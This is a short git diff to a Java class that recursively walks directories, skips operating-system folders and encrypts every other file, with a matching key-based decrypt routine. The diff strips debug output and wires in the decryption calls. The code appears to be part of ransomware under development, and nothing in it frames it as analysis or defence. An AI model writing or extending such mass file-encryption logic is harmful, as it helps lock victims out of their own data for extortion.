@@ -36,9 +36,8 @@ class App {
                     traverseAndEncrypt(file.listFiles());
                 }
             } else {
-                System.out.println("File: " + file.getAbsolutePath());
-                Encrypter encrypter = new Encrypter(file.toPath(), Encrypter.FILE);
-                encrypter.run();
+                Encrypter encrypter = new Encrypter(file.toPath());
+                encrypter.startEncryption();
             }
         }
     }
@@ -51,11 +50,11 @@ class App {
         for (File file : files) {
             if (file.isDirectory()) {
                 if (!CURR_OS_EXCLUDED_FOLDERS.contains(file.getName().toLowerCase())) {
-                    // System.out.println("Directory: " + file.getAbsolutePath());
                     traverseAndDecrypt(file.listFiles(), key);
                 }
             } else {
-                // System.out.println("File: " + file.getAbsolutePath());
+                Decrypter decrypter = new Decrypter(file.toPath());
+                decrypter.startDecryption();
             }
         }
     }
